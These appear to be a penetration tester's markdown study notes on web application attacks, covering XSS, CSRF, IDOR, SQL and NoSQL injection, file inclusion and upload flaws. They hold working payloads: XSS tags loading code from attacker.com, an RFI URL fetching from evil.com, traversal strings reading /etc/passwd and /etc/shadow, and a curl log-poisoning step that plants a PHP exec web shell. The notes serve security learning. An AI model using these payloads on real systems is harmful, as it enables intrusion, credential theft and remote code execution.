# Web Applications Attacks

[TOC]



## Client Side

### Cross-site Scripting (XSS)

+ **Reflected**: 

  Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation. 

+ **Stored**: 

  As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page (user input is permanently stored by the application and XSS is triggered every time it is read from the database and displayed to the user). This type of XSS can be particularly damaging due to the number of victims that may be affected. An example of this could be a blog that allows visitors to leave comments. If a visitor's message is not properly validated and checked for XSS payloads, then every subsequent visit to the blog page would run the malicious JavaScript code.

+ **DOM-based**: 

  DOM stands for **D**ocument **O**bject **M**odel and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source.

  DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code (XSS is injected directly into the page). Execution occurs when the website JavaScript code acts on input or user interaction. An example of this could be a website's JavaScript code getting the contents from the `window.location.hash` parameter and then write that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.

 + **Blind**

   Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first. An example of this could be a contact form. In the contact form, your message could contain an XSS payload, which when a member of staff views the message it gets executed.

+ Methodology
  + Try with a simple string: asd123, inspect the page source
  
  + Try various special characters: <>”[]()$--#/&’
    
    + Are they reflected back, filtered, encoded?
    
  + Insert a proof of concept: 
    
    + If an alert pops up, the page is vulnerable
    
  + What if they are filtered or encoded?
    
    + https://www.owasp.org/index.php/XSS_Filter_Evasion _Cheat_Sheet
    
  + Also possible to use other tags
  
    ```html
      <img src="javascript:alert(1)">
      <img onload="alert(1)">
      <iframe src="http://attacker.com/malicious.html">
    ```
  
  + Are certain words filtered?
    
    + Break them up with embedded newlines or tabs
    
  + Other cool tricks:
    
    + data: URI encoding
    + javascript in SVG files
    + data: URI encoded SVG files with embedded
      javascript<!--EndFragment-->
  
+ Tools
  
  + **beef** - [GitHub - beefproject/beef: The Browser Exploitation Framework Project](https://github.com/beefproject/beef/)
  + **Burp Suite**
  + **OWASP ZAP**
  
+ Cheat Sheet

  + [OWASP - XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
  + [Input Validation](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Input_Validation_Cheat_Sheet.md)



### Cross Site Request Forgery (CSRF)

+ Exploits the fact that Same-origin policy (SOP) does not prevent site A from issuing requests to site B



### IDOR vulnerability

IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability. An access control vulnerability is when an attacker can gain access to information or actions not intended for them. An IDOR vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), and too much trust has been placed on that input data, and the web application does not validate whether the user should, in fact, have access to the requested object.
This user-supplied data can mainly be found in the following three places:

+ POST parameters
+ GET parameters (directly in URL)
+ Cookies



## Server Side

### SQL Injection

**Boolean Based SQLi**

+ Transform a query in a True or False condition which reflects its state to the output

**Union Based SQLi**

+ 

#### SQLmap

| Flag                            | Description                                                  |
| ------------------------------- | ------------------------------------------------------------ |
| **-u** <url> or **--url**<=url> | Target URL (includes parameter)                              |
| **-p** <parameter>              | Specify parameter to test                                    |
| **--data**<=data>               | Specify the content of HTTP POST request                     |
| **--technique**<=technique>     | Specify SQLi technique to test                               |
| **--dbms**<=url>                | Specify the DBMS                                             |
| **--dbs**                       | List databases names                                         |
| **-D** <database_name>          | DBMS database to enumerate                                   |
| **--schema**                    | Enumerate DBMS schema                                        |
| **--tables**                    | List tables names                                            |
| **-T** <table_name>             | DBMS database table(s) to enumerate                          |
| **--columns**                   | Enumerate DBMS database table columns                        |
| **-C** <column1,column2>        | DBMS database table column(s) to enumerate                   |
| **--dump**                      | Dump DBMS database table entries                             |
| **--dump-all**                  | Dump all DBMS databases tables entries                       |
| **--level**<=level>             | Level of tests to perform (1-5, default 1)                   |
| **--risk**<=risk>               | Risk of tests to perform (1-3, default 1)                    |
| **--os-shell**                  | Prompt for an interactive operating system shell             |
| **--flush-session**             | Cleans SQLmap session memory (stored at: /usr/share/sqlpmap/output/) |



### NoSQL Injection

NoSQL injection is a web security vulnerability that allows the attacker to have control over the database. A NoSQL injection happens by sending queries via untrusted and unfiltered web application input, which leads to leaked unauthorized information. In addition, the attacker can use the NoSQL injection to perform various operations such as modifying data, escalating privileges, DoS attacks, and others.

To exploit NoSQL injection within the web application, first, you need to find an entry point that doesn't sanitize the user's input. Next, you need to understand how the web application passes the request to the database! Once you find an entry point, passing queries could be varied. Sometimes, the web app accepts the user's input via GET or POST queries, and sometimes web applications accept a JSON object, as is the case with APIs.




### Path Traversal - Remote File Inclusion

```http
# Example
http://example.com/downloads/getFile?name=http://evil.com/attack.txt
```

```http
# Encode your PHP payload as base64
https://site.com/home.php?page=data://text/plain;base64,base64encoded
```



### File Upload Vulnerabilities

+ Upload file which contains your code to get shell
+ Change extension
  + evil.php.jpg
  + evil.php.unknown



### Path Truncation

+ Abuse MAXPATHLEN
  + Maximal path length in the system
  + Automatic truncation
+ Make your query so long that ""*.xxx" will be truncated 
  + Easiest way: **add characters after**



### NULL-byte

+ PHP is based on C 

+ C uses the null byte as a string terminator

  ```http
  http://example.com/getFile?name=../../../../etc/passwd%00
  ```

  

### Local File Inclusion (LFI)
It is a web application vulnerability that allows the attacker to include and read local files on the server. These files could contain sensitive data such as cryptographic keys, databases that contain passwords, and other private data. An LFI  vulnerability happens due to a developer's lack of security awareness. In some cases, developers need to include the content of other local files within a specific page. Suppose a developer includes files without proper input validation. In that case, the LFI vulnerability will exist as a developer should never trust user input and keep all inputs from users to be filtered and sanitized. The main issue of these vulnerabilities is the lack of input validation, in which the user inputs are not sanitized or validated, and the user controls them. The following functions cause this kind of vulnerability: include, require, include_once, require_once.

#### Payloads
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline

  ```php
  #1 - Direct file inclusion + using .. to get out the current directory (the number of .. is varies depending on the web app directory)
  http://example.thm.labs/page.php?file=/etc/passwd http://example.thm.labs/page.php?file=../../../../../../etc/passwd 
  
  #2 - Bypassing filters using ....// ('../' is removed: Double your payload)
  http://example.thm.labs/page.php?file=....//....//....//....//etc/passwd
  http://example.com/downloads/getFile?name=..././..././..././..././etc/passwd
  
  #3 - URL encoding techniques (such as double encoding)
  http://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd
  http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00
  
  #Try different encodings
  ../../etc/passwd = %2e%2e%2f%2e%2e%2fetc%2fpasswd = %252E%252E%252F%252E%252E%252Fetc%252Fpasswd
  ```

  

#### Exploiting LFI
Exploiting an LFI sometimes is limited and depends on the web application server configuration. Besides reading sensitive data, often, we can obtain remote code execution. If we are dealing with a PHP web application, then we can use a PHP-supported Wrapper. PHP provides various methods of transmission of data (Input/Output stream) to allow PHP to read from. It will enable reading data via various data type channels: 
+ **PHP filter** - the wrapper is used in LFI to read the actual PHP page content. In typical cases, it is not possible to read a PHP file's content via LFI because PHP files get executed and never show the existing code. However, we can use the PHP filter to display the content of PHP files in other encoding formats such as base64 or ROT13.

```php
http://example.thm.labs/page.php?file=php://filter/read=string.rot13/resource=/etc/passwd 
http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
```




### File inclusion to Remote Code Execution

+ Problem: we can include local files, but can't upload our own code → 

+ Solution: send our code to the logfile and include that!

  ```shell
  curl -A "User-Agent: <?php exec(\$_GET['c']) ?>" http://site.com
  
  #Access File
  http://example.com/getFile?name=../../../../var/log/apache2/access.log%00
  
  #Add your commands
  http://example.com/getFile?c=ls&name=../../../../var/log/apache2/access.log%00
  ```

  

  